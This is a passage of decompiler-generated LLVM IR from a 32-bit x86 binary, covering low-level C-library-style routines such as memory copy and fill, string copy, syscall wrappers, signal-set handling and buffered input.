  %v0_8050652 = load i32, i32* @edi, align 4
  store i32 %v0_8050652, i32* %stack_var_-124, align 4
  %v3_8050653 = call i32 @function_80501bd(i32 %v0_8050652, i32 2, i32 1)
  store i32 %v3_8050653, i32* %eax.global-to-local, align 4
  %v2_805065b = icmp slt i32 %v3_8050653, 0
  %v1_805065d = icmp eq i1 %v2_805065b, false
  br i1 %v1_805065d, label %dec_label_pc_8050675, label %dec_label_pc_805065f

dec_label_pc_805065f:                             ; preds = %dec_label_pc_805064d, %dec_label_pc_8050639
  %v0_805065f = load i32, i32* %stack_var_-124, align 4
  %v1_805065f = call i32 @function_805078b(i32 %v0_805065f)
  store i32 %v1_805065f, i32* %eax.global-to-local, align 4
  store i32 %v1_805065f, i32* @ebx, align 4
  %v1_8050669 = inttoptr i32 %v1_805065f to i32*
  %v2_8050669 = load i32, i32* %v1_8050669, align 4
  %v0_805066b = load i32, i32* @edi, align 4
  store i32 %v0_805066b, i32* %stack_var_-124, align 4
  %v1_805066c = call i32 @function_8050253(i32 %v0_805066b)
  store i32 %v1_805066c, i32* %eax.global-to-local, align 4
  %v1_8050671 = load i32, i32* @ebx, align 4
  %v2_8050671 = inttoptr i32 %v1_8050671 to i32*
  store i32 %v2_8050669, i32* %v2_8050671, align 4
  br label %dec_label_pc_80506ea

dec_label_pc_8050675:                             ; preds = %dec_label_pc_805064d
  store i32 48, i32* %stack_var_-124, align 4
  %v1_805067a = call i32 @function_8050bbe(i32 48)
  store i32 %v1_805067a, i32* %eax.global-to-local, align 4
  store i32 %v1_805067a, i32* @ebx, align 4
  %v1_8050684 = icmp eq i32 %v1_805067a, 0
  br i1 %v1_8050684, label %dec_label_pc_80506d6, label %dec_label_pc_8050688

dec_label_pc_8050688:                             ; preds = %dec_label_pc_8050675
  %v0_8050688 = load i32, i32* @edi, align 4
  %v2_8050688 = inttoptr i32 %v1_805067a to i32*
  store i32 %v0_8050688, i32* %v2_8050688, align 4
  %v1_805068a = add i32 %v1_805067a, 16
  %v2_805068a = inttoptr i32 %v1_805068a to i32*
  store i32 0, i32* %v2_805068a, align 4
  %v1_8050691 = add i32 %v1_805067a, 8
  %v2_8050691 = inttoptr i32 %v1_8050691 to i32*
  store i32 0, i32* %v2_8050691, align 4
  %v1_8050698 = add i32 %v1_805067a, 4
  %v2_8050698 = inttoptr i32 %v1_8050698 to i32*
  store i32 0, i32* %v2_8050698, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_80506a3 = load i32, i32* @ebx, align 4
  %v2_80506a3 = add i32 %v1_80506a3, 20
  %v3_80506a3 = inttoptr i32 %v2_80506a3 to i32*
  store i32 %tmp, i32* %v3_80506a3, align 4
  %v0_80506a6 = load i32, i32* %eax.global-to-local, align 4
  %v6_80506ab = icmp ugt i32 %v0_80506a6, 511
  br i1 %v6_80506ab, label %dec_label_pc_80506b4, label %dec_label_pc_80506ad

dec_label_pc_80506ad:                             ; preds = %dec_label_pc_8050688
  %v0_80506ad = load i32, i32* @ebx, align 4
  %v1_80506ad = add i32 %v0_80506ad, 20
  %v2_80506ad = inttoptr i32 %v1_80506ad to i32*
  store i32 512, i32* %v2_80506ad, align 4
  br label %dec_label_pc_80506b4

dec_label_pc_80506b4:                             ; preds = %dec_label_pc_8050688, %dec_label_pc_80506ad
  %v0_80506b6 = load i32, i32* @ebx, align 4
  %v1_80506b6 = add i32 %v0_80506b6, 20
  %v2_80506b6 = inttoptr i32 %v1_80506b6 to i32*
  %v3_80506b6 = load i32, i32* %v2_80506b6, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_80506bb = call i32 @function_8051332(i64 1, i32 %v3_80506b6)
  store i32 %v3_80506bb, i32* %eax.global-to-local, align 4
  %v1_80506c3 = load i32, i32* @ebx, align 4
  %v2_80506c3 = add i32 %v1_80506c3, 12
  %v3_80506c3 = inttoptr i32 %v2_80506c3 to i32*
  store i32 %v3_80506bb, i32* %v3_80506c3, align 4
  %v1_80506c6 = icmp eq i32 %v3_80506bb, 0
  %v1_80506c8 = icmp eq i1 %v1_80506c6, false
  br i1 %v1_80506c8, label %dec_label_pc_80506ee, label %dec_label_pc_80506ca

dec_label_pc_80506ca:                             ; preds = %dec_label_pc_80506b4
  %v0_80506cd = load i32, i32* @ebx, align 4
  store i32 %v0_80506cd, i32* %stack_var_-124, align 4
  %v1_80506ce = call i32 @function_8051983(i32 %v0_80506cd)
  store i32 %v1_80506ce, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506d6

dec_label_pc_80506d6:                             ; preds = %dec_label_pc_8050675, %dec_label_pc_80506ca
  %v0_80506d9 = load i32, i32* @edi, align 4
  store i32 %v0_80506d9, i32* %stack_var_-124, align 4
  %v1_80506da = call i32 @function_8050253(i32 %v0_80506d9)
  store i32 %v1_80506da, i32* %eax.global-to-local, align 4
  %v1_80506df = call i32 @function_805078b(i32 %v0_80506d9)
  store i32 %v1_80506df, i32* %eax.global-to-local, align 4
  %v1_80506e4 = inttoptr i32 %v1_80506df to i32*
  store i32 12, i32* %v1_80506e4, align 4
  br label %dec_label_pc_80506ea

dec_label_pc_80506ea:                             ; preds = %dec_label_pc_805065f, %dec_label_pc_80506d6
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80506fb

dec_label_pc_80506ee:                             ; preds = %dec_label_pc_80506b4
  %v0_80506f0 = load i32, i32* @ebx, align 4
  %v1_80506f0 = add i32 %v0_80506f0, 24
  store i32 %v1_80506f0, i32* %eax.global-to-local, align 4
  store i32 %v1_80506f0, i32* %stack_var_-124, align 4
  %v1_80506f6 = call i32 @function_80520e7(i32 %v1_80506f0)
  store i32 %v1_80506f6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506fb

dec_label_pc_80506fb:                             ; preds = %dec_label_pc_80506ea, %dec_label_pc_80506ee
  br label %dec_label_pc_80506fe

dec_label_pc_80506fe:                             ; preds = %dec_label_pc_8050616, %dec_label_pc_80506fb
  %v0_8050701 = load i32, i32* @ebx, align 4
  store i32 %v0_8050701, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050701

; uselistorder directives
  uselistorder i32 %v3_80506bb, { 1, 0, 2 }
  uselistorder i32 %v1_805067a, { 0, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_805065f, { 1, 0, 2 }
  uselistorder i32 %v3_8050627, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @function_8050253, { 12, 11, 10, 9, 8, 3, 5, 2, 4, 1, 0, 7, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80506fe, { 1, 0 }
  uselistorder label %dec_label_pc_80506fb, { 1, 0 }
  uselistorder label %dec_label_pc_80506ea, { 1, 0 }
  uselistorder label %dec_label_pc_80506d6, { 1, 0 }
  uselistorder label %dec_label_pc_80506b4, { 1, 0 }
}

define i32 @function_8050707(i32* %arg1) local_unnamed_addr {
dec_label_pc_8050707:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_8050710 = add i32 %tmp3, 24
  store i32 %v1_8050710, i32* @ebx, align 4
  %v2_8050719 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050719, i32* @eax, align 4
  %v2_805071e = call i32 @function_80520ea(i32 %v2_8050719, i32 134553831)
  %v0_8050723 = load i32, i32* @ebx, align 4
  %v1_8050726 = call i32 @function_80520e7(i32 %v0_8050723)
  br label %dec_label_pc_805072e

dec_label_pc_805072e:                             ; preds = %dec_label_pc_8050759, %dec_label_pc_8050707
  %v0_805072e = load i32, i32* @esi, align 4
  %v1_805072e = add i32 %v0_805072e, 8
  %v2_805072e = inttoptr i32 %v1_805072e to i32*
  %v3_805072e = load i32, i32* %v2_805072e, align 4
  %v2_8050731 = add i32 %v0_805072e, 4
  %v3_8050731 = inttoptr i32 %v2_8050731 to i32*
  %v4_8050731 = load i32, i32* %v3_8050731, align 4
  %v6_8050734 = icmp ugt i32 %v3_805072e, %v4_8050731
  br i1 %v6_8050734, label %dec_label_pc_8050759, label %dec_label_pc_8050736

dec_label_pc_8050736:                             ; preds = %dec_label_pc_805072e
  %v0_8050736 = load i32, i32* @edx, align 4
  %v1_8050737 = add i32 %v0_805072e, 20
  %v2_8050737 = inttoptr i32 %v1_8050737 to i32*
  %v3_8050737 = load i32, i32* %v2_8050737, align 4
  %v1_805073a = add i32 %v0_805072e, 12
  %v2_805073a = inttoptr i32 %v1_805073a to i32*
  %v3_805073a = load i32, i32* %v2_805073a, align 4
  %v1_805073d = inttoptr i32 %v0_805072e to i32*
  %v2_805073d = load i32, i32* %v1_805073d, align 4
  %v4_805073f = call i32 @function_805252a(i32 %v2_805073d, i32 %v3_805073a, i32 %v3_8050737, i32 %v0_8050736)
  %tmp13 = icmp slt i32 %v4_805073f, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_805074f, label %dec_label_pc_805074b

dec_label_pc_805074b:                             ; preds = %dec_label_pc_8050736
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050775

dec_label_pc_805074f:                             ; preds = %dec_label_pc_8050736
  %v1_805074f = load i32, i32* @esi, align 4
  %v2_805074f = add i32 %v1_805074f, 8
  %v3_805074f = inttoptr i32 %v2_805074f to i32*
  store i32 %v4_805073f, i32* %v3_805074f, align 4
  %v0_8050752 = load i32, i32* @esi, align 4
  %v1_8050752 = add i32 %v0_8050752, 4
  %v2_8050752 = inttoptr i32 %v1_8050752 to i32*
  store i32 0, i32* %v2_8050752, align 4
  %v0_8050759.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050759

dec_label_pc_8050759:                             ; preds = %dec_label_pc_805072e, %dec_label_pc_805074f
  %v1_8050767 = phi i32 [ %v0_805072e, %dec_label_pc_805072e ], [ %v0_8050759.pre, %dec_label_pc_805074f ]
  %v1_8050759 = add i32 %v1_8050767, 4
  %v2_8050759 = inttoptr i32 %v1_8050759 to i32*
  %v3_8050759 = load i32, i32* %v2_8050759, align 4
  %v2_805075e = add i32 %v1_8050767, 12
  %v3_805075e = inttoptr i32 %v2_805075e to i32*
  %v4_805075e = load i32, i32* %v3_805075e, align 4
  %v5_805075e = add i32 %v4_805075e, %v3_8050759
  store i32 %v5_805075e, i32* @ebx, align 4
  %v1_8050761 = add i32 %v5_805075e, 8
  %v2_8050761 = inttoptr i32 %v1_8050761 to i16*
  %v3_8050761 = load i16, i16* %v2_8050761, align 2
  %v4_8050761 = zext i16 %v3_8050761 to i32
  store i32 %v4_8050761, i32* @edx, align 4
  %v2_8050765 = add i32 %v4_8050761, %v3_8050759
  store i32 %v2_8050765, i32* %v2_8050759, align 4
  %v0_805076a = load i32, i32* @ebx, align 4
  %v1_805076a = add i32 %v0_805076a, 4
  %v2_805076a = inttoptr i32 %v1_805076a to i32*
  %v3_805076a = load i32, i32* %v2_805076a, align 4
  %v1_805076d = load i32, i32* @esi, align 4
  %v2_805076d = add i32 %v1_805076d, 16
  %v3_805076d = inttoptr i32 %v2_805076d to i32*
  store i32 %v3_805076a, i32* %v3_805076d, align 4
  %v0_8050770 = load i32, i32* @ebx, align 4
  %v1_8050770 = inttoptr i32 %v0_8050770 to i32*
  %v2_8050770 = load i32, i32* %v1_8050770, align 4
  %v3_8050770 = icmp eq i32 %v2_8050770, 0
  br i1 %v3_8050770, label %dec_label_pc_805072e, label %dec_label_pc_8050775.loopexit

dec_label_pc_8050775.loopexit:                    ; preds = %dec_label_pc_8050759
  br label %dec_label_pc_8050775

dec_label_pc_8050775:                             ; preds = %dec_label_pc_8050775.loopexit, %dec_label_pc_805074b
  store i32 %v2_8050719, i32* @eax, align 4
  %v2_805077e = call i32 @function_80520ea(i32 %v2_8050719, i32 1)
  %v0_8050783 = load i32, i32* @ebx, align 4
  ret i32 %v0_8050783

; uselistorder directives
  uselistorder i32 %v1_8050767, { 1, 0 }
  uselistorder i32 %v0_805072e, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_8050759, { 1, 0 }
}

define i32 @function_805078b(i32 %arg1) local_unnamed_addr {
dec_label_pc_805078b:
  ret i32 ptrtoint (i32* @global_var_8054414.30 to i32)
}

define i32 @function_8050791() local_unnamed_addr {
dec_label_pc_8050791:
  %tmp = call i64 @__decompiler_undefined_function_4()
  %stack_var_-16 = alloca i32, align 4
  %v1_8050799 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8050799 = call i32 @function_80528ff(%tms* %v1_8050799)
  %v4_805079e = trunc i64 %tmp to i32
  %v4_80507a2 = load i32, i32* %stack_var_-16, align 4
  %v5_80507a2 = add i32 %v4_80507a2, %v4_805079e
  %v3_80507a9 = mul i32 %v5_80507a2, 10000
  %v1_80507af = and i32 %v3_80507a9, 2147483632
  ret i32 %v1_80507af

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_80507b5(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80507b5:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80507b6 = load i32, i32* @esi, align 4
  store i32 %v0_80507b6, i32* %stack_var_-8, align 4
  %v4_80507b7 = ptrtoint i8* %arg1 to i32
  %v9_80507c3 = icmp ugt i8* %tmp3, %arg1
  %v1_80507c5 = icmp eq i1 %v9_80507c3, false
  br i1 %v1_80507c5, label %dec_label_pc_80507cd, label %dec_label_pc_80507c7

dec_label_pc_80507c7:                             ; preds = %dec_label_pc_80507b5
  %v7_80507c9 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_80507d9

dec_label_pc_80507cd:                             ; preds = %dec_label_pc_80507b5
  %v3_80507cd = add i32 %arg2, -1
  %v4_80507cd = add i32 %v3_80507cd, %arg3
  %v5_80507cd = inttoptr i32 %v4_80507cd to i8*
  %v3_80507d1 = add i32 %v4_80507b7, -1
  %v4_80507d1 = add i32 %v3_80507d1, %arg3
  %v5_80507d1 = inttoptr i32 %v4_80507d1 to i8*
  %v7_80507d6 = call i8* @_memcpy(i8* %v5_80507d1, i8* %v5_80507cd, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_80507d9

dec_label_pc_80507d9:                             ; preds = %dec_label_pc_80507c7, %dec_label_pc_80507cd
  %v2_80507d9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80507d9, i32* @esi, align 4
  ret i32 %v4_80507b7

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80507d9, { 1, 0 }
}

define i32 @function_80507dc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80507dc:
  %v0_80507dc = load i32, i32* @edi, align 4
  %v4_80507e5 = ptrtoint i8* %arg1 to i32
  %v5_80507e9 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_80507dc, i32* @edi, align 4
  ret i32 %v4_80507e5

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_80507f1(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80507f1:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80507f2 = load i32, i32* @esi, align 4
  store i32 %v0_80507f2, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80507fa = ptrtoint i8* %arg1 to i32
  store i32 %v4_80507fa, i32* %edi.global-to-local, align 4
  %v4_80507fe.pre = load i32, i32* @eax, align 4
  %v8_80507fe.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80507fe

dec_label_pc_80507fe:                             ; preds = %dec_label_pc_80507fe.dec_label_pc_80507fe_crit_edge, %dec_label_pc_80507f1
  %v2_80507ff = phi i32 [ %v7_80507ff, %dec_label_pc_80507fe.dec_label_pc_80507fe_crit_edge ], [ %v4_80507fa, %dec_label_pc_80507f1 ]
  %v8_80507fe = phi i1 [ %v5_80507ff, %dec_label_pc_80507fe.dec_label_pc_80507fe_crit_edge ], [ %v8_80507fe.pre, %dec_label_pc_80507f1 ]
  %v4_80507fe = phi i32 [ %v0_8050800, %dec_label_pc_80507fe.dec_label_pc_80507fe_crit_edge ], [ %v4_80507fe.pre, %dec_label_pc_80507f1 ]
  %v7_80507fe = phi i32 [ %v0_80507fe.pre, %dec_label_pc_80507fe.dec_label_pc_80507fe_crit_edge ], [ %arg2, %dec_label_pc_80507f1 ]
  %v1_80507fe = inttoptr i32 %v7_80507fe to i8*
  %v2_80507fe = load i8, i8* %v1_80507fe, align 1
  %v3_80507fe = zext i8 %v2_80507fe to i32
  %v5_80507fe = and i32 %v4_80507fe, -256
  %v6_80507fe = or i32 %v3_80507fe, %v5_80507fe
  store i32 %v6_80507fe, i32* %eax.global-to-local, align 4
  %v9_80507fe = select i1 %v8_80507fe, i32 -1, i32 1
  %v10_80507fe = add i32 %v7_80507fe, %v9_80507fe
  store i32 %v10_80507fe, i32* %esi.global-to-local, align 4
  %v3_80507ff = inttoptr i32 %v2_80507ff to i8*
  store i8 %v2_80507fe, i8* %v3_80507ff, align 1
  %v4_80507ff = load i32, i32* %edi.global-to-local, align 4
  %v5_80507ff = load i1, i1* @df, align 1
  %v6_80507ff = select i1 %v5_80507ff, i32 -1, i32 1
  %v7_80507ff = add i32 %v6_80507ff, %v4_80507ff
  store i32 %v7_80507ff, i32* %edi.global-to-local, align 4
  %v0_8050800 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050800 = trunc i32 %v0_8050800 to i8
  %v4_8050800 = icmp eq i8 %v3_8050800, 0
  %v1_8050802 = icmp eq i1 %v4_8050800, false
  br i1 %v1_8050802, label %dec_label_pc_80507fe.dec_label_pc_80507fe_crit_edge, label %dec_label_pc_8050804

dec_label_pc_80507fe.dec_label_pc_80507fe_crit_edge: ; preds = %dec_label_pc_80507fe
  %v0_80507fe.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80507fe

dec_label_pc_8050804:                             ; preds = %dec_label_pc_80507fe
  store i32 %v4_80507fa, i32* %eax.global-to-local, align 4
  %v2_8050809 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050809, i32* %esi.global-to-local, align 4
  ret i32 %v4_80507fa

; uselistorder directives
  uselistorder i32 %v0_8050800, { 1, 0 }
  uselistorder i32 %v7_80507ff, { 1, 0 }
  uselistorder i1 %v5_80507ff, { 1, 0 }
  uselistorder i32 %v4_80507fa, { 1, 2, 0, 3 }
}

define i32 @function_805080c() local_unnamed_addr {
dec_label_pc_805080c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v2_805080f = ptrtoint i32* %stack_var_-4 to i32
  %v2_8050818 = inttoptr i32 %tmp to i8*
  %v3_8050818 = call i32 @function_80529d1(i8* %v2_8050818, i32 %v2_805080f)
  %v1_8050823 = icmp eq i32 %v3_8050818, 0
  br i1 %v1_8050823, label %dec_label_pc_805082b, label %dec_label_pc_8050827

dec_label_pc_8050827:                             ; preds = %dec_label_pc_805080c
  %v3_8050827 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805082b

dec_label_pc_805082b:                             ; preds = %dec_label_pc_805080c, %dec_label_pc_8050827
  %v0_805082b = phi i32 [ -1, %dec_label_pc_805080c ], [ %v3_8050827, %dec_label_pc_8050827 ]
  ret i32 %v0_805082b

; uselistorder directives
  uselistorder label %dec_label_pc_805082b, { 1, 0 }
}

define i32 @function_8050831(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050831:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805084c = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050853 = call i32 @function_805241b(i32 2, i32 %v2_805084c)
  ret i32 %v2_8050853

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805085c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805085c:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050877 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805087e = call i32 @function_805241b(i32 3, i32 %v2_8050877)
  ret i32 %v2_805087e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8050887(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050887:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80508a2 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80508a9 = call i32 @function_805241b(i32 6, i32 %v2_80508a2)
  ret i32 %v2_80508a9

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80508b2() local_unnamed_addr {
dec_label_pc_80508b2:
  %stack_var_-20 = alloca i32, align 4
  %v2_80508dd = ptrtoint i32* %stack_var_-20 to i32
  %v2_80508e4 = call i32 @function_805241b(i32 15, i32 %v2_80508dd)
  ret i32 %v2_80508e4
}

define i32 @function_80508ed(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80508ed:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_8050900 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8050907 = call i32 @function_805241b(i32 4, i32 %v2_8050900)
  ret i32 %v2_8050907

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_8050910() local_unnamed_addr {
dec_label_pc_8050910:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050933 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805093a = call i32 @function_805241b(i32 10, i32 %v2_8050933)
  ret i32 %v2_805093a
}

define i32 @function_8050943() local_unnamed_addr {
dec_label_pc_8050943:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050976 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805097d = call i32 @function_805241b(i32 12, i32 %v2_8050976)
  ret i32 %v2_805097d
}

define i32 @function_8050986() local_unnamed_addr {
dec_label_pc_8050986:
  %stack_var_-16 = alloca i32, align 4
  %v2_80509a9 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80509b0 = call i32 @function_805241b(i32 9, i32 %v2_80509a9)
  ret i32 %v2_80509b0
}

define i32 @function_80509b9() local_unnamed_addr {
dec_label_pc_80509b9:
  %stack_var_-24 = alloca i32, align 4
  %v2_80509ec = ptrtoint i32* %stack_var_-24 to i32
  %v2_80509f3 = call i32 @function_805241b(i32 11, i32 %v2_80509ec)
  ret i32 %v2_80509f3
}

define i32 @function_80509fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80509fc:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8050a27 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8050a2e = call i32 @function_805241b(i32 14, i32 %v2_8050a27)
  ret i32 %v2_8050a2e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8050a37(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050a37:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8050a52 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8050a59 = call i32 @function_805241b(i32 1, i32 %v2_8050a52)
  ret i32 %v2_8050a59

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_805241b, { 6, 10, 5, 0, 4, 3, 9, 2, 7, 1, 8 }
}

define i32 @function_8050a62(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050a62:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8050a7a, label %dec_label_pc_8050a6d

dec_label_pc_8050a6d:                             ; preds = %dec_label_pc_8050a62
  %v1_8050a6d = add i32 %arg1, -64
  %v3_8050a6d = sub i32 63, %arg1
  %v4_8050a6d = and i32 %v3_8050a6d, %arg1
  %v5_8050a6d = icmp slt i32 %v4_8050a6d, 0
  %v6_8050a6d = icmp eq i32 %v1_8050a6d, 0
  %v7_8050a6d = icmp slt i32 %v1_8050a6d, 0
  %v3_8050a70 = icmp eq i1 %v7_8050a6d, %v5_8050a6d
  %v4_8050a70 = icmp eq i1 %v6_8050a6d, false
  %v5_8050a70 = and i1 %v4_8050a70, %v3_8050a70
  br i1 %v5_8050a70, label %dec_label_pc_8050a7a, label %dec_label_pc_8050a72

dec_label_pc_8050a72:                             ; preds = %dec_label_pc_8050a6d
  %v4_8050a75 = call i32 @function_8050b78(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8050a7a

dec_label_pc_8050a7a:                             ; preds = %dec_label_pc_8050a6d, %dec_label_pc_8050a62, %dec_label_pc_8050a72
  %v1_8050a7a = call i32 @function_805078b(i32 ptrtoint (i32* @0 to i32))
  %v1_8050a7f = inttoptr i32 %v1_8050a7a to i32*
  store i32 22, i32* %v1_8050a7f, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8050a6d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050a7a, { 2, 0, 1 }
}

define i32 @function_8050a8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050a8c:
  %v3_8050a9a = inttoptr i32 %arg1 to i8*
  %v4_8050a9a = call i32 @function_80507dc(i8* %v3_8050a9a, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8050aa5(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050aa5:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8050aa5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8050aba = icmp eq i32 %arg2, -1
  %arg1.off = add i32 %arg1, -1
  %tmp35 = icmp ugt i32 %arg1.off, 63
  %tmp36 = or i1 %tmp35, %v10_8050aba
  br i1 %tmp36, label %dec_label_pc_8050ac8, label %dec_label_pc_8050ae3.lr.ph

dec_label_pc_8050ac8:                             ; preds = %dec_label_pc_8050aa5
  %v1_8050ac8 = call i32 @function_805078b(i32 %v0_8050aa5)
  store i32 %v1_8050ac8, i32* %eax.global-to-local, align 4
  %v1_8050acd = inttoptr i32 %v1_8050ac8 to i32*
  store i32 22, i32* %v1_8050acd, align 4
  br label %dec_label_pc_8050b4c

dec_label_pc_8050ae3.lr.ph:                       ; preds = %dec_label_pc_8050aa5
  %v15_8050aa6 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8050ae328 = add i32 %v15_8050aa6, 284
  %v5_8050ae329 = inttoptr i32 %v4_8050ae328 to i32*
  store i32 0, i32* %v5_8050ae329, align 4
  %v0_8050aee30 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050aee31 = add i32 %v0_8050aee30, -1
  %v9_8050aee32 = icmp slt i32 %v1_8050aee31, 0
  store i32 %v1_8050aee31, i32* %eax.global-to-local, align 4
  %v1_8050aef33 = icmp eq i1 %v9_8050aee32, false
  br i1 %v1_8050aef33, label %dec_label_pc_8050ae3.dec_label_pc_8050ae3_crit_edge, label %dec_label_pc_8050af1

dec_label_pc_8050ae3.dec_label_pc_8050ae3_crit_edge: ; preds = %dec_label_pc_8050ae3.lr.ph, %dec_label_pc_8050ae3.dec_label_pc_8050ae3_crit_edge
  %v1_8050aee34 = phi i32 [ %v1_8050aee, %dec_label_pc_8050ae3.dec_label_pc_8050ae3_crit_edge ], [ %v1_8050aee31, %dec_label_pc_8050ae3.lr.ph ]
  %v0_8050ae3.pre = load i32, i32* @esp, align 4
  %v2_8050ae3 = mul i32 %v1_8050aee34, 4
  %v3_8050ae3 = add i32 %v0_8050ae3.pre, 160
  %v4_8050ae3 = add i32 %v3_8050ae3, %v2_8050ae3
  %v5_8050ae3 = inttoptr i32 %v4_8050ae3 to i32*
  store i32 0, i32* %v5_8050ae3, align 4
  %v0_8050aee = load i32, i32* %eax.global-to-local, align 4
  %v1_8050aee = add i32 %v0_8050aee, -1
  %v9_8050aee = icmp slt i32 %v1_8050aee, 0
  store i32 %v1_8050aee, i32* %eax.global-to-local, align 4
  %v1_8050aef = icmp eq i1 %v9_8050aee, false
  br i1 %v1_8050aef, label %dec_label_pc_8050ae3.dec_label_pc_8050ae3_crit_edge, label %dec_label_pc_8050af1

dec_label_pc_8050af1:                             ; preds = %dec_label_pc_8050ae3.dec_label_pc_8050ae3_crit_edge, %dec_label_pc_8050ae3.lr.ph
  %v0_8050af1 = load i32, i32* @edx, align 4
